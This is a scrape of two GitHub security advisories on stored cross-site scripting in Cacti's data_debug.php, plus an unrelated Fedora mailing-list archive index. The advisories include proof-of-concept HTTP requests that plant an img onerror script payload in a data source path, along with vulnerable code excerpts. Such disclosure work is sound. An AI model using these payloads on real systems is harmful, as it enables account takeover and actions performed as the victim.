=== Content from github.com_9a0f0aa1_20250114_234207.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCacti%2Fcacti%2Fsecurity%2Fadvisories%2FGHSA-q7g7-gcf6-wh4x)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCacti%2Fcacti%2Fsecurity%2Fadvisories%2FGHSA-q7g7-gcf6-wh4x)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=Cacti%2Fcacti)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Cacti](/Cacti)
/
**[cacti](/Cacti/cacti)**
Public

* [Notifications](/login?return_to=%2FCacti%2Fcacti) You must be signed in to change notification settings
* [Fork
  406](/login?return_to=%2FCacti%2Fcacti)
* [Star
   1.7k](/login?return_to=%2FCacti%2Fcacti)

* [Code](/Cacti/cacti)
* [Issues
  144](/Cacti/cacti/issues)
* [Pull requests
  1](/Cacti/cacti/pulls)
* [Discussions](/Cacti/cacti/discussions)
* [Actions](/Cacti/cacti/actions)
* [Projects
  0](/Cacti/cacti/projects)
* [Wiki](/Cacti/cacti/wiki)
* [Security](/Cacti/cacti/security)
* [Insights](/Cacti/cacti/pulse)

Additional navigation options

* [Code](/Cacti/cacti)
* [Issues](/Cacti/cacti/issues)
* [Pull requests](/Cacti/cacti/pulls)
* [Discussions](/Cacti/cacti/discussions)
* [Actions](/Cacti/cacti/actions)
* [Projects](/Cacti/cacti/projects)
* [Wiki](/Cacti/cacti/wiki)
* [Security](/Cacti/cacti/security)
* [Insights](/Cacti/cacti/pulse)

# XSS vulnerability when viewing data sources in debug mode

Moderate

[netniV](/netniV)
published
GHSA-q7g7-gcf6-wh4x
Dec 20, 2023

## Package

cacti

## Affected versions

1.2.25

## Patched versions

None

## Description

### Summary

The fix applied for CVE-2023-39515 in version 1.2.25 is incomplete as it enables an adversary to have a victim browser execute malicious code when a victim user hovers their mouse over the malicious data source path in data\_debug.php.

### Details

My colleague Vissarion Moutafis of CENSUS had reported an issue ([GHSA-hrg9-qqqx-wc4h](https://github.com/Cacti/cacti/security/advisories/GHSA-hrg9-qqqx-wc4h "GHSA-hrg9-qqqx-wc4h")) where it was possible to trigger an XSS by rendering a malicious data source path in data\_debug.php.

While verifying the fix for this (and the other reported vulnerabilities) we found that the fix applied to CVE-2023-39515 was incomplete.

Although changes have been applied to the code to HTML encode the "title" attribute and "value" of the data source path, the "title" attribute is passed to jquery-ui in an unsafe way to form a tooltip.

It is our understanding that jquery-ui by default does not allow HTML input for tooltips. However cacti has overriden

this behaviour of jquery-ui with the following code:

```
layout.js:831
        $(document).tooltip({
                items: 'div.cactiTooltipHint, span.cactiTooltipHint, .checkboxSlider',
                content: function() {
                        var element = $(this);

                        if (element.is('div')) {
                                var text = $(this).find('span').html();
                        } else if (element.is('span') || element.is('a')) {
                                var text = $(this).prop('title');
                        }
                        return text;
                }
        });

```

There's a related thread in stackoverflow:

<https://stackoverflow.com/questions/15734105/jquery-ui-tooltip-does-not-support-html-content>

The above code will take the "title" attribute value and use it "as is" to formulate the tooltip message. If the title attribute contains malicious code, this will be executed while the tooltip is rendered, due to code by jquery-ui that looks like this:

```
jquery-ui.js:18821
tooltip.find( ".ui-tooltip-content" ).html( content );

```

Remember how the "title" was supposed to be "protected" via HTML encoding? When HTML encoded data land in an HTML attribute value, the browser transforms these to the proper values. For example, if we pass `<span title="&#39;">` to a browser the HTML parser of the browser will turn this into `<span title="'">`, i.e. it will transform `&#39;` to a single quote. Hence any HTML encoding we did to the "title" attribute is wasted once the data becomes part of the browser's DOM.

There's one more point in the code where the default tooltip processing is overriden and this is:

```
managers.php:365
        <script language='javascript' type='text/javascript' >
                $('.tooltip').tooltip({
                        track: true,
                        position: { collision: 'flipfit' },
                        content: function() { return $(this).attr('title'); }
                });
        </script>

```

CENSUS recommends against using HTML content in tooltips of jquery-ui, reverting the tooltip processing flow to its default behaviour. If tooltips are indeed required to contain HTML content the "title" value should first be passed through a sanitization process like the one applied by 'HTML purifier'.

We do not believe that a new CVE is required to track this. We (CENSUS) will happily review any fixes applied for this issue.

The trigger for this issue was spotted by our colleague Adrianos Valadakis, while the root cause analysis was performed by myself (Dimitrios Glynos).

### PoC

Much like CVE-2023-39515 we can use the following call to set the malicious data source path in the database:

```
POST /cacti/data_sources.php?header=false HTTP/1.1
Host: HOST
Content-Length: 761
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://<HOST>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: <COOKIE>
Connection: close

__csrf_magic=<CSRF TOKEN>&data_template_id=3&host_id=2&_data_template_id=3&_host_id=2&_data_input_id=15&data_template_data_id=198&local_data_template_data_id=3&local_data_id=8&name=%7Chost_description%7C+-+Apache+HTTP++-+CPU+Load&data_source_path=%3Cpath_rra%3E%2Fasdf_apache_cpuload_8.rrd%3Cimg+src%3Dx+onerror%3D%22alert('data+source+path')%22%3E&data_input_id=15&data_source_profile_id=1&rrd_step=300&active=on&data_source_name_277=apache_cpuload&rrd_minimum_277=0&rrd_maximum_277=100&data_source_type_id_277=1&rrd_heartbeat_277=600&data_input_field_id_277=52&value_51=asdf&save_component_data=1&save_component_data_source=1&action=save

```

For the attacker to place the malicious payload, the aforementioned General Administration>Sites/Devices/Data privileges are required.

A victim user with privileges to view debug\_data.php should now visit the following URL:

`https://<HOST>/cacti/data_debug.php`

After clicking on the affected "data source" and entering the Troubleshooting screen, once the user hovers the mouse over the malicious data source path value, the malicious code will be executed twice, as illustrated in the screenshot below.

[![data-source-path](https://user-images.githubusercontent.com/44968893/269674122-9b5753e5-e3fc-4268-9d05-b18e28434ac3.png)](https://user-images.githubusercontent.com/44968893/269674122-9b5753e5-e3fc-4268-9d05-b18e28434ac3.png)

### Impact

To perform the XSS attack the adversary needs to be an authorized cacti user with the following permissions:

`General Administration>Sites/Devices/Data`

The victim of this attack could be any account with permissions to view `http://<HOST>/cacti/data_debug.php`.

Once the attacker has executed the malicious JavaScript within the victim's browser it is possible to:

* perform a victim-account takeover
* perform arbitrary actions on the platform as the victim user
* redirect the user to a malicious website
* ask for sensitive information, under the cover of the cacti webpage
* run browser related exploits and attacks
* have the victim browser join a botnet and participate in a DDoS attack

### Severity

Moderate

6.1

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
High

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N

### CVE ID

CVE-2023-49088

### Weaknesses

[CWE-79](/advisories?query=cwe%3A79)

### Credits

* [![@dglynos](https://avatars.githubusercontent.com/u/44968893?s=40&v=4)](/dglynos)
  [dglynos](/dglynos)
  Reporter
* [![@VissaMoutafis](https://avatars.githubusercontent.com/u/44686370?s=40&v=4)](/VissaMoutafis)
  [VissaMoutafis](/VissaMoutafis)
  Finder
* [![@umbrassador](https://avatars.githubusercontent.com/u/86792882?s=40&v=4)](/umbrassador)
  [umbrassador](/umbrassador)
  Finder

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_da798419_20250114_234204.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCacti%2Fcacti%2Fsecurity%2Fadvisories%2FGHSA-hrg9-qqqx-wc4h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCacti%2Fcacti%2Fsecurity%2Fadvisories%2FGHSA-hrg9-qqqx-wc4h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=Cacti%2Fcacti)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Cacti](/Cacti)
/
**[cacti](/Cacti/cacti)**
Public

* [Notifications](/login?return_to=%2FCacti%2Fcacti) You must be signed in to change notification settings
* [Fork
  406](/login?return_to=%2FCacti%2Fcacti)
* [Star
   1.7k](/login?return_to=%2FCacti%2Fcacti)

* [Code](/Cacti/cacti)
* [Issues
  144](/Cacti/cacti/issues)
* [Pull requests
  1](/Cacti/cacti/pulls)
* [Discussions](/Cacti/cacti/discussions)
* [Actions](/Cacti/cacti/actions)
* [Projects
  0](/Cacti/cacti/projects)
* [Wiki](/Cacti/cacti/wiki)
* [Security](/Cacti/cacti/security)
* [Insights](/Cacti/cacti/pulse)

Additional navigation options

* [Code](/Cacti/cacti)
* [Issues](/Cacti/cacti/issues)
* [Pull requests](/Cacti/cacti/pulls)
* [Discussions](/Cacti/cacti/discussions)
* [Actions](/Cacti/cacti/actions)
* [Projects](/Cacti/cacti/projects)
* [Wiki](/Cacti/cacti/wiki)
* [Security](/Cacti/cacti/security)
* [Insights](/Cacti/cacti/pulse)

# Cross-Site Scripting vulnerability with Data Source Name when debugging Data Queries

Moderate

[netniV](/netniV)
published
GHSA-hrg9-qqqx-wc4h
Sep 5, 2023

## Package

cacti

## Affected versions

<1.2.25

## Patched versions

1.2.25, 1.3.0

## Description

### Summary

A Stored Cross-Site-Scripting Vulnerability allows an authenticated user to poison data stored in the cacti's database. These data will be viewed by administrative cacti accounts and execute JavaScript code in the victim's browser at view-time.

### Details

The script under `data_debug.php` displays data source related debugging information such as *data source paths, polling settings, meta-data on the data source*. *CENSUS* found that an adversary that is able to configure a malicious data-source path, can deploy a stored XSS attack against any user that has privileges related to viewing the `data_debug.php` information.

A user that possesses the *General Administration>Sites/Devices/Data* permissions can configure the data source path in *cacti*. This configuration occurs through `http://<HOST>/cacti/data_sources.php`.

The related vulnerable code that renders the malicious payload can be found in `data_debug.php:761`

```
array(
	'name' => 'rrd_writable',
	'title' => __('Is RRDfile writeable by poller?'),
	'value' => $real_path
),
```

In the above code block the variable `$real_path`, is rendered without any escaping, thus allowing for a stored XSS attack.

A Stored XSS attack, aka Stored Cross Site Scripting attack, is manifested when an adversary poisons data that is stored in the back-end with malicious JavaScript code. If a site is vulnerable to a stored XSS attack then when the poisoned data get rendered on the victim's browser, the malicious code block will become part of the browser's DOM and with thus be executed at view-time.

Therefore, it is possible for a victim that has followed an attacker provided URL of the form `http://<HOST>/cacti/data_debug.php?action=view&id=<INFECTED DATA RESOURE ID>` (or for a victim that has navigated to inspect the poisoned data source) to trigger the XSS vulnerability.

### PoC

To verify the issue one can perform the following call to place malicious JavaScript in the cacti database:

```
POST /cacti/data_sources.php?header=false HTTP/1.1
Host: HOST
Content-Length: 761
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://<HOST>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: <COOKIE>
Connection: close

__csrf_magic=<CSRF TOKEN>&data_template_id=3&host_id=2&_data_template_id=3&_host_id=2&_data_input_id=15&data_template_data_id=198&local_data_template_data_id=3&local_data_id=8&name=%7Chost_description%7C+-+Apache+HTTP++-+CPU+Load&data_source_path=%3Cpath_rra%3E%2Fasdf_apache_cpuload_8.rrd%3Cimg+src%3Dx+onerror%3D%22alert('data+source+path')%22%3E&data_input_id=15&data_source_profile_id=1&rrd_step=300&active=on&data_source_name_277=apache_cpuload&rrd_minimum_277=0&rrd_maximum_277=100&data_source_type_id_277=1&rrd_heartbeat_277=600&data_input_field_id_277=52&value_51=asdf&save_component_data=1&save_component_data_source=1&action=save

```

For the attacker to place the malicious payload, the aforementioned *General Administration>Sites/Devices/Data* privileges are required. For the victim to view the malicious information, privileges of viewing the `debug_data.php` information are required (Resource Path: *Troubleshooting>Data Sources*).

An example request that renders the malicious data can be found below:

```
GET /cacti/data_debug.php?action=view&id=8 HTTP/1.1
Host: <HOST>
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: <COOKIE>
Connection: close

```

Following the rendered payload in the response of the above request

```
<tr class='odd selectable tableRow' id='line5'>
	<td class="nowrap">Is RRDfile writeable by poller?</td>
	<td class="nowrap"><span class='cactiTooltipHint' style='padding:0px;margin:0px;' title='<script>alert(data source path)</script>'><script>alert('data source path')</script></span></td>
	<td class="nowrap"><i class="fa fa-spinner fa-pulse fa-fw"></i></td>
</tr>
```
### Impact

To perform the Stored XSS attack the adversary needs to be an authorized cacti user with the following permissions:

* *General Administration>Sites/Devices/Data*

The victim of this attack could be any account with permissions to view `http://<HOST>/cacti/data_debug.php`

Once the attacker has executed the malicious JavaScript within the victim's browser it is possible to

* perform a victim-account takeover
* perform arbitrary actions on the platform as the victim user
* redirect the user to a malicious website
* ask for sensitive information, under the cover of the cacti webpage
* run browser related exploits and attacks
* join a browser botnet and participate in a DDoS attack

### Remediation

Before rendering this user supplied information either make this be a text element in the rendered HTML or escape (by using HTML entities) the content so that the malicious block will not be considered as code in the final HTML output.

> The issue was identified by *Vissarion Moutafis* of *CENSUS*. *CENSUS* will be releasing an advisory for this issue once a release that fixes the issue becomes available (or in 90 days, whichever comes first). Should you require assistance with the review of the patch we will be more than happy to help!

### Severity

Moderate

6.1

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
High

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N

### CVE ID

CVE-2023-39515

### Weaknesses

[CWE-79](/advisories?query=cwe%3A79)

### Credits

* [![@VissaMoutafis](https://avatars.githubusercontent.com/u/44686370?s=40&v=4)](/VissaMoutafis)
  [VissaMoutafis](/VissaMoutafis)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.fedoraproject.org_08df3a04_20250114_234210.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/RBEOAFKRARQHTDIYSL723XAFJ2Q6624X/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/RBEOAFKRARQHTDIYSL723XAFJ2Q6624X/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/RBEOAFKRARQHTDIYSL723XAFJ2Q6624X/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/RBEOAFKRARQHTDIYSL723XAFJ2Q6624X/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
